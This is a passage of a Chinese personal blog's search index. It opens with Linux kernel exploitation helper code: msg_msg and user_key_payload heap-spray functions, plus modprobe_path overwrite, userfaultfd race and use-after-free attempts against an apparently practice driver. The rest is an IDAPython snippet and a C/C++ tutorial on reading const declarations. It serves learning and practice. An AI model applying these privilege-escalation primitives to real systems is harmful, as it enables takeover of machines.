class="comment"> *      4. recv_msg*():@size，想要从消息队列中获取的字节数，其包含0x8的mtype</span></span><br><span class="line"><span class="comment"> * 内容和struct msg_msg头和@size的数据</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值:</span></span><br><span class="line"><span class="comment"> *      1. send_msg():@ret返回创建的消息队列id</span></span><br><span class="line"><span class="comment"> *      2. recv_msg*():@ret返回读取的缓冲数组</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参考:</span></span><br><span class="line"><span class="comment"> * https://www.anquanke.com/post/id/252558</span></span><br><span class="line"><span class="comment"> * https://elixir.bootlin.com/linux/v6.1/source/ipc/msg.c#L848</span></span><br><span class="line"><span class="comment"> * https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1090</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">long</span> m_type;</span><br><span class="line">    <span class="type">size_t</span> m_ts;    <span class="comment">// message text大小</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> *security; <span class="comment">// 由于未开启SELinux，该字段恒为0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">send_msg</span><span class="params">(<span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *content)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">msgbuf</span> &#123;</span></span><br><span class="line">        <span class="type">long</span> mtype;</span><br><span class="line">        <span class="type">char</span> mtext[size - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    &#125; msg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建</span></span><br><span class="line">    assert((qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    msg.mtype = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(msg.mtext, content, size - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg));</span><br><span class="line">    assert(msgsnd(qid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[send_msg] msgget = %d\n&quot;</span>, qid);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> qid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">recv_msg</span><span class="params">(<span class="type">int</span> qid, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *memdump;</span><br><span class="line"></span><br><span class="line">    assert((memdump = <span class="built_in">malloc</span>(size)) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(msgrcv(qid, memdump, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> memdump;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">recv_msg_nocopy</span><span class="params">(<span class="type">int</span> qid, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *memdump;</span><br><span class="line"></span><br><span class="line">    assert((memdump = <span class="built_in">malloc</span>(size)) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(msgrcv(qid, memdump, size, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> memdump;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* struct user_key_payload读</span></span><br><span class="line"><span class="comment"> * 结构体:</span></span><br><span class="line"><span class="comment"> *        struct user_key_payload &#123;</span></span><br><span class="line"><span class="comment"> *        struct rcu_headrcu;// RCU destructor</span></span><br><span class="line"><span class="comment"> *        unsigned shortdatalen;// length of this data</span></span><br><span class="line"><span class="comment"> *        char        data[] __aligned(__alignof__(u64)); // actual data</span></span><br><span class="line"><span class="comment"> *        &#125;;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 条件：</span></span><br><span class="line"><span class="comment"> *      1. 驱动中存在UAF，块大小为[0x18, 0x10000]，可以更改内存的[0x10, 0x14)处的值</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *      1. spray_addkey():@payload，即用户上传的key内容，被复制到data部分</span></span><br><span class="line"><span class="comment"> *      2. spray_addkey():@size，即内核要申请的data大小,h. 注意，spray_addkey()中，</span></span><br><span class="line"><span class="comment"> * 内核会申请两个大小相近的块，`kvmalloc(@size, GFP_KERNEL)`和</span></span><br><span class="line"><span class="comment"> * `kmalloc(sizeof(struct user_key_payload) + @size, GFP_KERNEL)`</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> *      1. spray_addkey():@ret，即创建的key的唯一表示</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 参考：</span></span><br><span class="line"><span class="comment"> * https://www.anquanke.com/post/id/228233#h3-10</span></span><br><span class="line"><span class="comment"> * https://github.com/Markakd/n1ctf2020_W2L/blob/main/leak.c</span></span><br><span class="line"><span class="comment"> * https://elixir.bootlin.com/linux/v6.1/source/security/keys/keyctl.c#L74</span></span><br><span class="line"><span class="comment"> * https://elixir.bootlin.com/linux/v6.1/source/security/keys/key.c#L816</span></span><br><span class="line"><span class="comment"> * https://elixir.bootlin.com/linux/v6.1/source/security/keys/user_defined.c#L59</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_MAX_DESC_SIZE 4096</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU destructor */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>datalen;<span class="comment">/* length of this data */</span></span><br><span class="line"><span class="type">char</span>data[] __attribute__ ((__aligned__(<span class="keyword">sizeof</span>(__u64)))); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">key_serial_t</span> <span class="title function_">spray_addkey</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *payload, <span class="type">uint32_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *payload_buf;</span><br><span class="line">  <span class="type">key_serial_t</span> key;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 减去struct user_key_payload头，确保内核申请的大小为</span></span><br><span class="line"><span class="comment">   * @size</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  assert(size &gt;= <span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_key_payload));</span><br><span class="line">  size -= <span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_key_payload);</span><br><span class="line"></span><br><span class="line">  assert((payload_buf = <span class="built_in">malloc</span>(size)) != <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">strncpy</span>(payload_buf, payload, size);</span><br><span class="line"></span><br><span class="line">  assert((key = syscall_x64(SYS_add_key, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;kernel-pwn-key&quot;</span>, payload_buf, size,</span><br><span class="line">                        KEY_SPEC_PROCESS_KEYRING)) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[spray_addkey] add_key = %x\n&quot;</span>, key);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">spray_readkey</span><span class="params">(<span class="type">key_serial_t</span> key, <span class="type">uint32_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *payload;</span><br><span class="line"></span><br><span class="line">  assert((payload = <span class="built_in">malloc</span>(size)) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  assert(syscall_x64(SYS_keyctl, KEYCTL_READ, key, payload, size, <span class="number">0</span>) == size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> payload;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 本次exp的符号定义</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VULN_WRITE0x1737</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VULN_READ0x1738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VULN_ALLOC0x1739</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VULN_FREE0x173A</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> *modprobe_path = (<span class="type">long</span> <span class="type">long</span>*) <span class="number">0xffffffff82651120</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> fake_modprobe_path = <span class="number">0x612f706d742f</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> *addr;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> val;</span><br><span class="line">&#125; Data;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">uf_handler</span><span class="params">(<span class="type">void</span> *page)</span></span><br><span class="line">&#123;</span><br><span class="line">    Data *data = (Data *)page;</span><br><span class="line">    data-&gt;addr = modprobe_path;</span><br><span class="line">    data-&gt;val = fake_modprobe_path;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">uf_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(ioctl(gfd1, VULN_WRITE, gaddr1) == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 尝试使用modprobe进行提权</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//int fd;</span></span><br><span class="line">    <span class="comment">//Data data;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//assert((fd = open(&quot;/dev/vuln&quot;, O_RDWR)) &gt;= 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//data.addr = modprobe_path;</span></span><br><span class="line">    <span class="comment">//data.val = fake_modprobe_path;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//assert(ioctl(fd, VULN_WRITE, &amp;data) == 0);</span></span><br><span class="line">    <span class="comment">//modprobe_exp();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">///* 尝试使用userfaultfd扩大条件竞争</span></span><br><span class="line">    <span class="comment">// */</span></span><br><span class="line">    <span class="comment">//Data data;</span></span><br><span class="line">    <span class="comment">//long long buf;</span></span><br><span class="line">    <span class="comment">//uint64_t len;</span></span><br><span class="line">    <span class="comment">//pthread_t thread;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//len = 0x1000;</span></span><br><span class="line">    <span class="comment">//assert((gfd1 = open(&quot;/dev/vuln&quot;, O_RDWR)) &gt;= 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 注册userfaultfd，并通过ur_thr触发page fault</span></span><br><span class="line">    <span class="comment">//assert((gaddr1 = mmap(NULL, len, PROT_READ | PROT_WRITE,</span></span><br><span class="line">    <span class="comment">//                    MAP_PRIVATE | MAP_ANONYMOUS, -1 ,0))</span></span><br><span class="line">    <span class="comment">//       != MAP_FAILED);</span></span><br><span class="line">    <span class="comment">//thread = userfaultfd_exp(gaddr1, len, uf_thread, uf_handler);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 此时page fault还未处理完，条件竞争读取modprobe_path值</span></span><br><span class="line">    <span class="comment">//data.addr = modprobe_path;</span></span><br><span class="line">    <span class="comment">//data.val = (long long)&amp;buf;</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_READ, &amp;data) == 0);</span></span><br><span class="line">    <span class="comment">//assert(buf != fake_modprobe_path);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 等待uf_thr终止</span></span><br><span class="line">    <span class="comment">//assert(pthread_join(thread, NULL) == 0);</span></span><br><span class="line">    <span class="comment">//modprobe_exp();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">///* 尝试利用struct msg_msg结构体</span></span><br><span class="line">    <span class="comment">// * 进行数据读取或写入</span></span><br><span class="line">    <span class="comment">// */</span></span><br><span class="line">    <span class="comment">//Data data;</span></span><br><span class="line">    <span class="comment">//char *kbuf1, *kbuf2;</span></span><br><span class="line">    <span class="comment">//int qid, size = 0x80;</span></span><br><span class="line">    <span class="comment">//assert((gfd1 = open(&quot;/dev/vuln&quot;, O_RDWR)) &gt;= 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 内核态申请0x80大小的内存</span></span><br><span class="line">    <span class="comment">//data.val = size;</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_ALLOC, &amp;data) == 0)</span></span><br><span class="line">    <span class="comment">//kbuf1 = (char *)data.addr;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 制造UAF</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_FREE, &amp;data) == 0)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 开始heap spray</span></span><br><span class="line">    <span class="comment">//qid = send_msg_str(size, &quot;hhaawwkk1&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 利用UAF修改struct msg_msg的m_ts字段</span></span><br><span class="line">    <span class="comment">//data.addr = (long long*)(kbuf1 + offsetof(struct msg_msg, m_ts));</span></span><br><span class="line">    <span class="comment">//data.val = 0x1000;</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_WRITE, &amp;data) == 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//assert((kbuf2 = recv_msg_nocopy(qid, 0x1000)) != NULL);</span></span><br><span class="line">    <span class="comment">//assert(((long long)kbuf1 + 0x100) == ((long long*)kbuf2)[0x13]);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">///* 尝试利用struct user_key_payload结构体</span></span><br><span class="line">    <span class="comment">// * 进行数据读取或写入</span></span><br><span class="line">    <span class="comment">// */</span></span><br><span class="line">    <span class="comment">//Data data;</span></span><br><span class="line">    <span class="comment">//char *kbuf1, *kbuf2;</span></span><br><span class="line">    <span class="comment">//int size = 0x70;</span></span><br><span class="line">    <span class="comment">//key_serial_t key;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//assert((gfd1 = open(&quot;/dev/vuln&quot;, O_RDWR)) &gt;= 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 内核态申请0x80大小的内存</span></span><br><span class="line">    <span class="comment">//data.val = size;</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_ALLOC, &amp;data) == 0)</span></span><br><span class="line">    <span class="comment">//kbuf1 = (char *)data.addr;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 制造UAF</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_FREE, &amp;data) == 0)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 开始heap spray</span></span><br><span class="line">    <span class="comment">//key = spray_addkey(&quot;hhaawwkk1&quot;, size);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 利用UAF修改struct user_key_payload的datalen字段</span></span><br><span class="line">    <span class="comment">//data.addr = (long long*)(kbuf1 + offsetof(struct user_key_payload, datalen));</span></span><br><span class="line">    <span class="comment">//data.val = 0x1000;</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_WRITE, &amp;data) == 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//kbuf2 = spray_readkey(key, 0x1000);</span></span><br><span class="line">    <span class="comment">//assert(((long long)kbuf1 + 0x100) == ((long long*)kbuf2)[0x15]);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>  IDA是世界上顶级的交互式反汇编工具，往往使用<strong>IDA</strong>静态分析程序，从而理清程序中的代码组织结构，并统计相关资源信息</p><h2 id="IDAPython"><a href="#IDAPython" class="headerlink" title="IDAPython"></a>IDAPython</h2><p>  这是IDA的一个插件，允许IDA执行相关的<em>python</em>脚本信息。其中，该插件提供了大量的<a href="https://hex-rays.com/products/ida/support/idapython_docs/frames.html">IDA接口</a>，从而可以方便的获取程序的相关信息，我们将其整理成如下模板<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">获取虚拟地址处的1字节的值</span></span><br><span class="line"><span class="string">返回的是整形</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">val = ida_bytes.get_byte(address)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设置 </tag>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入了解const</title>
      <link href="/2021/07/15/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3const/"/>
      <url>/2021/07/15/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3const/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  之前在学习<strong>C++</strong>的时候，对于<strong>const</strong>等相关概念了解的不是很清楚，最后在使用时就很痛苦😖<br>  这次彻底的总结一下<strong>const</strong>相关的知识点</p><h1 id="阅读变量声明"><a href="#阅读变量声明" class="headerlink" title="阅读变量声明"></a>阅读变量声明</h1><p>  实际上，<strong>const</strong>位于变量声明的不同位置，会产生不同的作用。因此，首先我们需要学会如何阅读变量的声明语句，从而了解变量的具体类型，获取<strong>const</strong>修饰的对象，才能知道其作用。</p><p>  这里我们依照<a href="https://parrt.cs.usfca.edu/doc/how-to-read-C-declarations.html">由右至左规则</a>，可以有效的分解变量的类型。</p><p>  整个<strong>由右至左规则</strong>如下所示：</p><ol><li>从变量名称开始</li><li>向右依次列出所有的关键词，直到遇到不匹配的右括号或者结束停止</li><li>向左依次列出所有的关键词，直到遇到不匹配的左括号或者结束停止</li><li><p>如果因为括号停止，则跳出括号，重新执行步骤2.</p><p>这里我们举一个比较有挑战性的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> (*(*x())[])();</span><br></pre></td></tr></table></figure></li></ol><p>下面给出按照上述分析的步骤</p><ul><li>根据<strong>步骤1</strong>，找到变量名称<code>x</code>，即 <code>char (*(*</code><del><code>x</code></del><code>())[])();</code></li><li>根据<strong>步骤2</strong><ol><li>找到<code>()</code>，即 <code>char (*(*</code><del><code>x()</code></del><code>)[])();</code>，因此为<strong>无参函数</strong></li><li>右边遇到<strong>不匹配右括号</strong>，结束</li></ol></li><li>根据<strong>步骤3</strong><ol><li>找到<code>*</code>，即 <code>char (*(</code><del><code>*x()</code></del><code>)[])();</code>，因此返回值为<strong>指针</strong></li><li>左边遇到<strong>不匹配左括号</strong>，结束</li></ol></li><li>根据<strong>步骤4</strong>，跳出括号，即 <code>char (*</code><del><code>(*x())</code></del><code>[])();</code></li><li>根据<strong>步骤2</strong><ol><li>找到<code>[]</code>，即<code>char (*</code><del><code>(*x())[]</code></del><code>)();</code>，因此其指针指向一个数组</li><li>右边遇到<strong>不匹配右括号</strong>，结束</li></ol></li><li>根据<strong>步骤3</strong><ol><li>找到<code>*</code>，即<code>char (</code><del><code>*(*x())[]</code></del><code>)();</code>，因此该数组元素都是指针</li><li>左边遇到<strong>不匹配左括号</strong>，结束</li></ol></li><li>根据<strong>步骤4</strong>， 跳出括号，即<code>char</code><del><code>(*(*x())[])</code></del><code>();</code></li><li>根据<strong>步骤2</strong><ol><li>找到<code>()</code>，即<code>char</code><del><code>(*(*x())[])();</code></del>，因此该指针是指向<strong>无参函数</strong>的指针</li><li>右边<strong>完结</strong>，结束</li></ol></li><li><p>根据<strong>步骤3</strong></p><ol><li>找到<code>char</code>，即<del><code>char (*(*x())[])();</code></del>，因此函数的返回值为<strong>char</strong>类型</li><li>左边遇到<strong>完结</strong>，结束</li></ol><p>综上可知，该变量是一个无参函数，其返回值是一个指针，该指针指向一个数组，数组中的元素都是指针，这些指针指向返回值为<code>char</code>的无参函数。</p></li></ul><h1 id="const性质"><a href="#const性质" class="headerlink" title="const性质"></a>const性质</h1><p>  <strong>const</strong>表示修饰的值不能改变，这就是该关键词的性质。</p><p>  那么实际上，根据上面的规则，我们很容易完全理解<strong>const</strong>的种种特性</p><ol><li><p><code>const type a;</code>/<code>type const a;</code><br>即<strong>const</strong>用来修饰<code>type</code>类型，也就是变量<code>a</code>的值不能进行改变</p></li><li><p><code>const type *a;</code>/<code>const type &amp;a;</code><br>根据前面的规则，这是一个<strong>指针</strong>/<strong>引用</strong>，其指向/引用一个<code>const type</code>类型——也就是其指向/引用的值不能修改，但其本身并没有要求</p></li><li><p><code>type * const a;</code><br>根据前面的规则，这是一个<code>const</code>对象，该对象是一个指向<code>type</code>的指针——也就是该指针不能重新指向新的对象，但是其指向的值可以进行任意的修改</p></li><li><p><code>const type * const a;</code><br>根据前面的规则，这是一个<code>const</code>对象，该对象是<code>const type *</code>类型，即该对象是一个指针，指针指向<code>const type</code>类型——即该指针既不能重新指向新的对象，也不可以修改其指向的值。</p><p>总的来说，基本就是按照前面的规则解释变量类型，其中<code>const</code>修饰的对象的值不能改变</p></li></ol><h1 id="顶层const和底层const"><a href="#顶层const和底层const" class="headerlink" title="顶层const和底层const"></a>顶层const和底层const</h1><h2 id="顶层const"><a href="#顶层const" class="headerlink" title="顶层const"></a>顶层const</h2><p>  对于对象本身是一个常量，不可更改对象本身的值，但在对像是指针或引用的情况下，可能修改其指向或引用的值，则称为<strong>顶层const</strong>，如<code>int * const p1;</code></p><h2 id="底层const"><a href="#底层const" class="headerlink" title="底层const"></a>底层const</h2><p>  如果对象是指针或引用，其指向或引用的对象的值不可更改，则称为<strong>底层const</strong>，如<code>const int &amp;r1;</code></p><h2 id="差别"><a href="#差别" class="headerlink" title="差别"></a>差别</h2><p>  在使用时，<strong>顶层const</strong>和<strong>底层const</strong>差别十分大，这里简单说一下常见的差别</p><ol><li><p>赋值、初始化</p><ul><li><p>对于<strong>顶层const</strong>，由于<strong>const</strong>可以兼容<strong>非const</strong>，因此对于赋值对象是否为<strong>常量</strong>不影响操作，如下所示</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p1 = <span class="literal">nullptr</span>, *<span class="type">const</span> p2 = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *<span class="type">const</span> p3 = p1, *<span class="type">const</span> p4 = p2;<span class="comment">//有效，const兼容非const的p1</span></span><br></pre></td></tr></table></figure></li><li><p>对于<strong>底层const</strong>，虽然<strong>const</strong>可以兼容<strong>非const</strong>，但是如果在<strong>底层const</strong>的情况下也进行兼容，可能会修改<strong>const</strong>类型的值，如下所示</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> val = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> *p1 = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="type">int</span> <span class="type">const</span> **p2 = &amp;p1;<span class="comment">//如果底层const可以被兼容，则&amp;p1为指向变量的指针，p2为指向常量的指针，则p2可以兼容&amp;p1</span></span><br><span class="line">*p2 = &amp;val;<span class="comment">//此时p1指向了&amp;val</span></span><br><span class="line">*p1 = <span class="number">1</span>;<span class="comment">//由于p1是指向变量的指针，因此其值可以进行改变，从而修改了常量val的值</span></span><br></pre></td></tr></table></figure><p>为了避免上面情况的发生，这里规定<strong>底层const</strong>不能兼容<strong>非const</strong>，如下所示</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="type">const</span> val = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="type">const</span> &amp;r1 = val, *<span class="type">const</span> p1 = &amp;val;<span class="comment">//有效，其底层const类型一致，顶层const可以兼容</span></span><br><span class="line"><span class="type">int</span> * <span class="type">const</span> *p2 = &amp;val;<span class="comment">//无效，因为其底层const不一致：p2底层指向变量，而&amp;val底层是常量</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>这里需要注意一下<code>typedef</code>关键字。即通过<code>typedef</code>关键字，其生成新的基本数据类型，并不是简单的宏替换。这点在<strong>const</strong>中特别关键，如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> *pstring</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> * p1;</span><br><span class="line"><span class="type">const</span> pstring p2;<span class="comment">//相当于pstring const p2;</span></span><br></pre></td></tr></table></figure><p>  如果仅仅将<code>typedef</code>当作简单的宏替换，那么<code>p2</code>的定义进行展开就是<code>p1</code>，其是一个指向<strong>常量char</strong>的指针，即<code>p1</code>的值可以进行任意的修改，但是<code>p1</code>指向的值不能进行修改<br>  但实际上，我们需要将<code>pstring</code>当作一个基本数据类型看待，即这是一个<strong>常量pstring</strong>类型，即<code>p2</code>不能随意更改其值；而由于<code>pstring</code>是指针类型，实际上我们仍然可以修改其指向的值。<br>  可以看到，两种理解方法，得出来的结论完全相反。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>manjaro配置</title>
      <link href="/2021/06/05/manjaro%E9%85%8D%E7%BD%AE/"/>
      <url>/2021/06/05/manjaro%E9%85%8D%E7%BD%AE/</url>
      
